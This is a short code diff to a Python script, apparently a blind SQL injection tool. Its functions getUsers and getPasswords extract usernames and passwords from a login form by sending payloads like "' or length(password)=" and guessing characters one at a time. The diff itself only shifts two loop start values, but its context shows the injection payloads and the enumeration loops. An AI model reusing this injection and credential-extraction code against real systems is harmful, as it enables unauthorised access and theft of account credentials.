@@ -67,7 +67,7 @@ def getUsers(max_length):
     # charecters. If it returns true and the length is the same as the 
     # current length, it is placed in doneUsers. If the length is greater
     # than the current, its is added to partialUsers
-    for x in range(1, max_length + 1):
+    for x in range(2, max_length + 1):
         for word in partialUsers:
             for i in iter.chain(range(48,58), range(97, 123)):
                 params = {'userName': "' or length(userName)!=" + str(x) + 
@@ -115,7 +115,7 @@ def getPasswords(max_length):
     # charecters. If it returns true and the length is the same as the 
     # current length, it is placed in done. If the length is greater
     # than the current, its is added to partial
-    for x in range(1, max_length + 1):
+    for x in range(2, max_length + 1):
         for word in partial:
             for i in iter.chain(range(48,58), range(97, 123)):
                 params = {'username': '', 'password': "' or length(password)="+
